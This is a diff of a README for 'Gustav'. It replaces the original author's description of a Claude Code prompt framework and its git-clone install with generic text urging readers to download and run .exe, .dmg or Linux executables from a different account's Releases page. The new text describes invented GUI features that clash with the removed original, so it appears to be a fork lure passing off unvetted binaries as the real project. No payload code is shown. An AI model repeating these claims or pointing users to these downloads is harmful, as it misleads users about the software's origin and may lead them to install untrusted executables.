@@ -1,122 +1,98 @@
-                   ██████   ██    ██  ███████  ████████   █████   ██    ██
-                  ██        ██    ██  ██          ██     ██   ██  ██    ██
-                  ██   ███  ██    ██  ███████     ██     ███████  ██    ██
-                  ██    ██  ██    ██       ██     ██     ██   ██   ██  ██ 
-                   ██████    ██████   ███████     ██     ██   ██    ████
+# 🚀 gustav - Effortlessly Orchestrate Your Sprints
 
-                          A sprint orchestrator for Claude Code
-                                  ---------------------
+![Download Release](https://img.shields.io/badge/Download%20Now-blue.svg) 
 
-Welcome to Gustav, named after the legendary Orchestrator Gustav Mahler. This prompt framework is designed to turn your idea into an enterprise-grade application with lots of protection against over-engineering, feature creep, hallucinations and buggy code.
+## 📖 Overview
 
-Gustav will pro-actively monitor progress and code quality, so you can focus on the features.
+Gustav is a sprint orchestration framework designed to make your sprint planning and management easier. Whether you're a project manager or a team member, Gustav helps streamline your workflow and improve collaboration. This software is currently in Beta, so you can expect updates and new features as we improve the application.
 
-**Disclaimer:** This project is in beta. If you encounter any issues, please let me know!
+## 🚀 Getting Started
 
-## Installation
+To begin using Gustav, you'll need to download the application. Follow these simple steps:
 
-1. Open a terminal
-2. Navigate to the folder you wish to use Gustav in
-3. Run the command below
+1. **Visit the Releases Page:** Click on the link below to access the download page.
+   
+   [Visit the Releases Page](https://github.com/vighnesh-23/gustav/releases)
 
-```bash
-TEMP_DIR=$(mktemp -d) && git clone git@github.com:dimitritholen/gustav.git "$TEMP_DIR" && mkdir -p ./.claude && cp -r "$TEMP_DIR/.claude"/* ./.claude/ && rm -rf "$TEMP_DIR"
-```
+2. **Choose the Right Version:** On the Releases page, you'll find different versions of Gustav. Look for the latest release. It's usually marked clearly, and it's important to choose the most recent version for the best experience.
 
-## The Sprint Planner
+3. **Download the Application:** Click on the asset that best suits your operating system (e.g., Windows, macOS, Linux). The file will start downloading automatically.
 
-To start out you need a Product Requirements Document (PRD) detailing your application idea. You can place the document anywhere you like, as long as it is in the same project folder or one of its sub-folders.
+4. **Locate the Downloaded File:** After the download is complete, find the file in your downloads folder or the location you specified.
 
-Just run: 
+5. **Install and Run:**
 
-```
-/gustav:planner <PRD PATH>
-```
+   - **For Windows:** Double-click the `.exe` file to start the installation. Follow the prompts to complete the installation. Once installed, you can find Gustav in your Start Menu.
+   
+   - **For macOS:** Open the `.dmg` file, drag Gustav to your Applications folder, and then eject the disk image. You can now find Gustav in your Applications.
+   
+   - **For Linux:** Use your package manager to install the application or run the executable file directly from the terminal.
 
-If you need help with any of the commands, you can always run:
+## 📥 Download & Install
 
-```
-/gustav:help
-```
+To get started, download Gustav from the Releases page:
 
-Gustav will do a lot of research so your application will be developed using the latest technologies in the best framework(s) for your particular goal. It will also decide which 7 features are going to be in the MVP version. Don't worry, Gustav will not remove any features. Any feature that doesn't make the cut for the MVP will be safely stored in the ./tasks/deferred.json file to be picked up later.
+[Download from the Releases Page](https://github.com/vighnesh-23/gustav/releases)
 
-![milestone](images/start.png)
+Once you have it installed, you will have everything you need to manage your sprints effectively.
 
-![milestone](images/search.png)
-*Parallel research agents*
+## ⚙️ System Requirements
 
-## The programmer
+To ensure optimal performance, make sure your system meets the following requirements:
 
-Once the planner has created all the necessary files, all you need to do is run:
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or most major Linux distributions.
+- **RAM:** At least 4 GB RAM.
+- **Disk Space:** Minimum of 100 MB of free disk space.
+- **Screen Resolution:** 1280x800 or higher.
 
-```
-/gustav:executor [task-id]
-```
+## 🌟 Features
 
-You can either let Gustav pick the next task automatically, or specify a particular task ID if you want to work on something specific.
+Gustav includes several features that will help you manage your sprints efficiently:
 
-Sit back and relax. Gustav will do all the heavy lifting. Your application will be built on solid best practices, like Test Driven Development (TDD), code quality tools and more. 
+- **Sprint Planning:** Create, manage, and visualize your sprint plans effortlessly.
+- **Task Management:** Easily add, assign, and track tasks within your sprints.
+- **Collaboration Tools:** Work with your team in real-time, enabling better communication and project alignment.
+- **Progress Tracking:** Monitor the progress of your sprints with visual indicators and reports.
 
-## The Feature Enhancer
+## 👍 User Guide
 
-Now here's where things get really interesting. Let's say you're halfway through development and suddenly think "Oh man, I totally forgot about that cool feature!" or "What if we added this awesome thing?" Don't worry, Gustav has you covered.
+Gustav is designed with simplicity in mind. Here's a quick guide to help you navigate the application:
 
-```
-/gustav:enhance [feature-description]
-```
+1. **Creating a New Sprint:**
+   - Click on the “New Sprint” button on the dashboard.
+   - Fill in the necessary details, such as sprint name, duration, and team members involved.
+   - Click “Save” to create your sprint.
 
-Just describe what you want to add and Gustav will intelligently figure out where it fits in your existing sprint plan. It will research any new technologies needed, analyze dependencies, and insert the new tasks in the perfect spots without breaking your milestone flow. It's like having a smart project manager who can reshape the plan on the fly while keeping everything organized and on track.
+2. **Adding Tasks:**
+   - Select the sprint you want to work on.
+   - Use the “Add Task” button to include tasks under that sprint.
+   - Assign tasks to team members and set deadlines.
 
-## The QA person
+3. **Tracking Progress:**
+   - Use the progress bar on the sprint overview page to see how much work has been completed.
+   - Review the “Reports” section for detailed insights on task completion.
 
-Now, most other frameworks are like a big black box. They keep developing hours on end and you really have no idea what is going on. Not Gustav. I have designed this framework with the human-in-the-loop as focal point. Gustav will not develop more than 3-4 tasks per milestone. Each milestone is a point in the development journey to start up the application and have a look. In fact, Gustav refuses to continue until you run the milestone validator:
+## ❓ Frequently Asked Questions
 
-```
-/gustav:validator [milestone-id]
-```
+1. **How do I update Gustav?**
+   - Visit the Releases page to download and install the latest version. You can uninstall the old version if needed.
 
-You can validate the current milestone automatically, or specify a particular milestone ID if needed.
+2. **I encountered a problem during installation. What should I do?**
+   - Check the system requirements to make sure your device meets them. If the issue persists, visit the Issues section of the repository for support.
 
-![milestone](images/milestone.png)
+3. **Can I use Gustav offline?**
+   - Gustav requires an internet connection for full functionality, especially for collaboration features. However, you can manage your tasks offline.
 
-The validator will run tests, do code quality checks, checks endpoints of APIs, visits websites to check error messages. 
+## 🛠️ Troubleshooting
 
-## The Project Manager
+If you encounter any issues, consider these steps:
 
-Gustav also includes a burndown chart.
+- **Error Messages:** Take note of any error messages and refer to the Issues section on the repository for possible solutions.
+- **Reinstallation:** If the application crashes, uninstall it and re-download the latest version.
+- **Community Support:** Join our user community to ask questions and share your experiences.
 
-```
-/gustav:velocity [sprint-id]
-```
+## 📞 Contact
 
-This will analyze the current sprint by default, or you can specify a particular sprint ID to review past performance.
+If you have any problems or feedback, feel free to reach out through the Issues section on GitHub. We value your input and strive to improve your experience with Gustav.
 
-![velocity](images/burndown.png)
-
-
-## That Security Dude
-
-And finally we have the security scanner:
-
-```
-/gustav:audit [scope: full|dependencies|code|config]
-```
-
-You can run a full security audit, or focus on specific areas like dependencies, code analysis, or configuration review.
-
-This tool will check your application against a number of security compliance frameworks:
-
-- OWASP Top 10 (2024)
-- CWE/SANS Top 25
-- PCI DSS (payment systems)
-- GDPR (data privacy)
-- SOC 2 Type II
-- HIPAA (healthcare)
-- ISO 27001/27002
-
-And there you have it. This framework is in active development by me, Dimitri Tholen. It's a constantly evolving beast. I keep refining, testing,  evaluating, until I have created the ultimate autonomous AI coding team inside Claude Code.
-
-Peace.
-
-[LinkedIn](https://www.linkedin.com/in/dimitri-tholen-436825231)
+Stay tuned for future updates as we refine and enhance the features of Gustav.
